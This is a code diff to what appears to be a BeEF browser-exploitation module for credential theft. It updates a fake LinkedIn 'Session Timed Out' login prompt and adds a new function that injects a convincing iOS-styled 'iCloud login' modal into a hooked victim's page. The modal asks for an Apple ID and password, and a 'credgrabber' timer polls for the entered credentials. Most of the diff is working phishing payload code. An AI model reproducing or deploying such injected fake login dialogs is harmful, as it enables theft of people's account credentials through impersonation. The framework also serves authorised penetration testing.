@@ -151,7 +151,7 @@ beef.execute(function() {
 		var box_prestyle = 'style="color: #666;font-size: 11px;font-weight: bold;font-family: Arial,sans-serif;padding-left:30px;"';
 		var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#CDCDCD;"';	
 		var buttonstyle = 'style="font-size: 13px;background:#069;color:#fff;font-weight:bold;border: 1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
-		var lilogo = 'http://press.linkedin.com/display-media/209/1';
+		var lilogo = 'http://content.linkedin.com/etc/designs/linkedin/katy/global/clientlibs/img/logo.png';
         	var title = 'Session Timed Out <img src="' + lilogo + '" align=right height=20 width=70 alt="LinkedIn">';
 	        var messagewords = 'Your session has timed out due to inactivity.<br/><br/>Please re-enter your username and password to login.';
         	var buttonLabel = '<input type="button" name="ok" value="Sign In" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';
@@ -268,6 +268,240 @@ beef.execute(function() {
 
 	}
 
+    function ios() {
+
+      /* start of Framework7 css
+       * Framework7 0.10.0
+       * Full Featured HTML Framework For Building iOS 7 Apps
+       *
+       * http://www.idangero.us/framework7
+       *
+       * Copyright 2014, Vladimir Kharlampidi
+       * The iDangero.us
+       * http://www.idangero.us/
+       *
+       * Licensed under MIT
+       *
+       * Released on: December 8, 2014
+      */
+    var styles = '   * {' +
+        'font-family: Helvetica Neue,Helvetica,Arial,sans-serif;'+
+        'margin: 0;'+
+        'padding: 0;'+
+        'font-size: 14px;' +
+        'line-height: 1.4;' +
+        '-webkit-text-size-adjust: 100%;' +
+        'overflow: hidden;' +
+        '-webkit-tap-highlight-color: transparent; ' +
+        '-webkit-touch-callout: none; } ';
+
+     styles += 'input { outline: 0; }';
+     styles += '.modal-overlay { ' +
+        'position: absolute; ' +
+        'left: 0; ' +
+        'top: 0; ' +
+        'width: 100%;' +
+        'height: 100%;' +
+        'background: rgba(0,0,0,.4);' +
+        ' z-index: 10600;' +
+        ' visibility: hidden;' +
+        'opacity: 0; ' +
+        '-webkit-transition-duration: 400ms;' +
+        'transition-duration: 400ms; } ';
+
+    styles += '.modal-overlay.modal-overlay-visible { visibility: visible; opacity: 1;} ';
+    styles += '.modal { width: 270px; position: absolute; z-index: 11000; left: 50%; ' +
+        'margin-left: -135px; margin-top: 0; top: 50%; text-align: center; border-radius: 7px;' +
+        'opacity: 0; -webkit-transform: translate3d(0,0,0) scale(1.185); ' +
+        'transform: translate3d(0,0,0) scale(1.185); -webkit-transition-property: -webkit-transform,opacity;' +
+        'transition-property: transform,opacity; color: #000;}';
+
+    styles += '.modal.modal-in {opacity: 1; -webkit-transition-duration: 400ms;transition-duration: 400ms;' +
+        '-webkit-transform: translate3d(0,0,0) scale(1); transform: translate3d(0,0,0) scale(1);}';
+    styles += '.modal-inner { padding: 15px;border-bottom: 1px solid #b5b5b5;border-radius: 7px 7px 0 0;' +
+    'background: #e8e8e8;}';
+    styles += '.modal-title { font-weight: 500; font-size: 18px;text-align: center}';
+    styles += '.modal-title + .modal-text {margin-top: 5px;}';
+    styles += '.modal-buttons { height: 44px; overflow: hidden;' +
+        'display: -webkit-box;' +
+        'display: -webkit-flex;' +
+        'display: flex;' +
+        '-webkit-box-pack: center;' +
+        '-webkit-justify-content: center;' +
+        'justify-content: center;}';
+
+     styles += '.modal-button {' +
+        'width: 100%;' +
+        'padding: 0 5px;' +
+        'height: 44px;' +
+        'font-size: 17px;' +
+        'line-height: 44px;' +
+        'text-align: center;' +
+        'color: #007aff;' +
+        'background: #e8e8e8;' +
+        'display: block;' +
+        'position: relative;' +
+        'white-space: nowrap;' +
+        'text-overflow: ellipsis;'+
+        'overflow: hidden;'+
+        'cursor: pointer;'+
+        '-webkit-box-sizing: border-box;'+
+        'box-sizing: border-box;'+
+        'border-right: 1px solid #b5b5b5;'+
+        '-webkit-box-flex: 1;} ';
+
+      styles += '.modal-button.modal-button-bold {font-weight: 500;} ';
+      styles += '.modal-button:first-child {border-radius:0 0 0 7px;} ';
+      styles += '.modal-button:last-child {'+
+        ' border-radius: 0 0 7px 0;' +
+        ' border-bottom: none; } ';
+      styles += "input.modal-text-input {" +
+        "-webkit-box-sizing: border-box;" +
+        "box-sizing: border-box;" +
+        "height: 30px;" +
+        "background: #fff;"+
+        "margin: 0;" +
+        "margin-top: 15px;" +
+        "padding: 0 5px;" +
+        "border: 1px solid #a0a0a0;" +
+        "border-radius: 5px;" +
+        "width: 100%;" +
+        "font-size: 14px;" +
+        "font-family: inherit;" +
+        "display: block;" +
+        "-webkit-box-shadow: 0 0 0 transparent;" +
+        "box-shadow: 0 0 0 transparent;" +
+        "-webkit-appearance: none;" +
+        "appearance: none; }";
+      styles += "input.modal-text-input.modal-text-input-double {" +
+        "border-radius: 5px 5px 0 0; }";
+      styles += "input.modal-text-input.modal-text-input-double+input.modal-text-input {"+
+       " margin-top: 0;" +
+       " border-top: 0;" +
+       " border-radius: 0 0 5px 5px; }";
+      /*end of Framework7 css*/
+      styles += "input[type=submit] { " +
+       " visibility: hidden;" +
+       " position: absolute;" +
+       " top: -999px; }";
+
+      styles += "input[type=text],input[type=password] { " +
+       " font-size: 16px; }" ;
+
+      styles += "#pass + div {"+
+       " display: block;"+
+        "position: absolute;"+
+        "top: -10px;"+
+        "left: -53px;"+
+        "width: 3000px;"+
+        "height: 3000px;"+
+        "background-color: white;"+
+        "z-index: 1;"+
+        "font-size: 14px;"+
+        "pointer-events: none;"+
+        "text-align: left; }";
+
+      styles += '@media only screen ' +
+      'and (min-device-width : 768px)' +
+      'and (max-device-width : 1024px)' +
+      'and (orientation : landscape) {' +
+          '.modal.modal-in {' +
+             ' opacity: 1;' +
+              '-webkit-transition-duration: 400ms;'+
+              'transition-duration: 400ms;'+
+              '-webkit-transform: translate3d(0,0,0) scale(0.9);'+
+              'transform: translate3d(0,0,0) scale(0.9);' +
+              'left: 200px;} ' +
+         ' #pass + div { top: -23px; left: -87px;} }';
+
+      styles +='@media only screen and (min-device-width : 768px)' +
+      'and (max-device-width : 1024px) and (orientation : portrait) {' +
+      '.modal.modal-in { opacity: 1; -webkit-transition-duration: 400ms;' +
+      'transition-duration: 400ms; -webkit-transform: translate3d(0,0,0) scale(0.8);'+
+      'transform: translate3d(0,0,0) scale(0.8);} ' +
+      '#pass + div {top: -39px;left: -305px;} }';
+
+      styles += '#pass:focus + div {display: none;}';
+
+        styleElement = $j(document.createElement('style')).text(styles);
+        title = $j(document.createElement('div'));
+        title.text('iCloud login');
+        title.addClass('modal-title');
+
+        description = $j(document.createElement('div'));
+        description.addClass('modal-text');
+        description.text('Enter your Apple ID e-mail address and password');
+
+        user = $j(document.createElement('input'));
+        user.addClass('modal-text-input').addClass('modal-text-input-double');
+        user.attr('name','modal-username');
+        user.attr('id','uname');
+        user.text('');
+        user.keydown(function(event) {
+            if(event.keyCode == 13) {
+                $j('#buttonpress').attr('value', 'true');
+            }
+        });
+
+        password = $j(document.createElement('input'));
+        password.addClass('modal-text-input').addClass('mobile-text-input-double');
+        password.attr('autofocus','');
+        password.attr('id', "pass");
+        password.attr('name',"modal-password");
+        password.attr('placeholder',"Password");
+        password.attr('type', 'password');
+        password.keydown(function(event) {
+            if(event.keyCode == 13) {
+                $j('#buttonpress').attr('value', 'true');
+            }
+        });
+
+        cancel = $j(document.createElement('span'));
+        cancel.addClass('modal-button');
+        cancel.text('Cancel');
+
+        ok = $j(document.createElement('span'));
+        ok.addClass('modal-button').addClass('modal-button-bold');
+        okLabel = $j(document.createElement('label'));
+        okLabel.attr('for','submit');
+        okLabel.css('width', '100%');
+        okLabel.css('height', '100%');
+        okLabel.text('OK');
+        okLabel.click(function() {
+            $j('#buttonpress').attr('value','true');
+        });
+        okLabel.append(
+            $j(document.createElement('input'))
+                        .attr('id', 'submit')
+                        .attr('type','submit')
+                        .attr('value','OK'),
+            $j(document.createElement('input'))
+                        .attr('id','buttonpress')
+                        .attr('type', 'hidden')
+                        .attr('name','buttonpress')
+                        .attr('value', 'false')
+        );
+        ok.append(okLabel);
+
+        var buttons = $j(document.createElement('div'));
+        buttons.addClass('modal-buttons');
+        buttons.append(cancel, ok);
+        var inner = $j(document.createElement('div'));
+        inner.addClass('modal-inner');
+        inner.append(title, description, user,password);
+        uiContainer = $j(document.createElement('div'));
+        uiContainer.addClass('modal').addClass('modal-in');
+        uiContainer.css('top', '10px');
+        uiContainer.append(inner, buttons);
+
+        sneakydiv = $j(document.createElement('div'));
+        sneakydiv.addClass('modal-overlay').addClass('modal-overlay-visible');
+        sneakydiv.attr('id','popup');
+        sneakydiv.append(styleElement, uiContainer);
+        $j('body').append(sneakydiv);
+        credgrabber = setInterval(checker, 1000);
+    }
+
 	// Generic floating div with image
 	function generic() {
 		sneakydiv = document.createElement('div');
@@ -303,6 +537,8 @@ beef.execute(function() {
 			youtube();  break;
 		case "Yammer":
 			yammer();   break;
+        case "IOS":
+            ios(); break;
 		default:
 			generic();  break;
 	}
